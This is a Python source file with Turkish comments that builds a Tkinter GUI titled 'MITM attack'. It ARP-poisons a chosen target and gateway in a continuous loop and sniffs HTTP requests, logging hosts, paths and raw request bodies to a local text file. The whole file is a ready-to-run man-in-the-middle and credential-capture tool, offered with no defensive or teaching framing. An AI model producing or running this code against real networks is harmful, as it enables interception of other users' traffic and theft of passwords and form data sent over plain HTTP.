from tkinter import *
import scapy.all as scapy
import threading
import time
from scapy.layers import http

# Paketleri dinleme fonksiyonu
def listen_packets(interface):
    print(f"Dinleniyor: {interface}")
    scapy.sniff(iface=interface, store=False, prn=analyse_packet)

# Yakalanan paketleri analiz etme ve dosyaya yazma fonksiyonu
def analyse_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        http_layer = packet.getlayer(http.HTTPRequest)
        method = http_layer.Method.decode()
        host = http_layer.Host.decode()
        path = http_layer.Path.decode()

        print(f"Method: {method}")
        print(f"Host: {host}")
        print(f"Path: {path}")

        if packet.haslayer(scapy.Raw):
            raw_data = packet[scapy.Raw].load
            print("Ham veri bulundu!")
            print(raw_data)

            # Veriyi dosyaya yazma
            with open("captured_data.txt", "a") as file:
                file.write(f"Method: {method}\n")
                file.write(f"Host: {host}\n")
                file.write(f"Path: {path}\n")
                file.write("Raw Data:\n")
                file.write(f"{raw_data.decode(errors='ignore')}\n\n")  # Ham veriyi stringe çevirirken hata yönetimi

# Paket dinlemeyi bir iş parçacığında başlatma fonksiyonu
def start_listening(interface):
    thread = threading.Thread(target=listen_packets, args=(interface,))
    thread.daemon = True
    thread.start()

# MAC adresini bulma fonksiyonu
def mac_address(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined = broadcast_packet / arp_request
    answer_list = scapy.srp(combined, timeout=1, verbose=False)[0]
    if answer_list:
        return answer_list[0][1].hwsrc
    else:
        print(f"IP için MAC adresi bulunamadı: {ip}")
        return None

# ARP zehirlenmesi fonksiyonu
def arp_poisoning(target_ip, gateway_ip):
    target_mac = mac_address(target_ip)
    if target_mac:
        arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
        scapy.send(arp_response, verbose=0)

# ARP zehirlenmesini bir iş parçacığında başlatma fonksiyonu
def start_attack(target_ip, gateway_ip):
    while True:
        arp_poisoning(target_ip, gateway_ip)
        arp_poisoning(gateway_ip, target_ip)
        time.sleep(1)

# Saldırı butonuna tıklama işlemi
def on_attack():
    target_ip = entry1.get()
    gateway_ip = entry2.get()
    attack_thread = threading.Thread(target=start_attack, args=(target_ip, gateway_ip))
    attack_thread.daemon = True
    attack_thread.start()

# Dinleme butonuna tıklama işlemi
def on_listen():
    interface = entry3.get()
    start_listening(interface)

# GUI Ayarları
pencere1 = Tk()
pencere1.geometry("500x500")
pencere1.title("MITM SALDIRISI")

Label(pencere1, text="Hedef IP adresini giriniz").pack()
entry1 = Entry(pencere1)
entry1.pack()

Label(pencere1, text="Gateway IP adresini giriniz").pack()
entry2 = Entry(pencere1)
entry2.pack()

Label(pencere1, text="Ağ Arabirimi").pack()
entry3 = Entry(pencere1)
entry3.pack()

Button(pencere1, text="Dinlemeyi Başlat", command=on_listen).pack()
Button(pencere1, text="MITM Saldırısını Başlat", command=on_attack).pack()

pencere1.mainloop()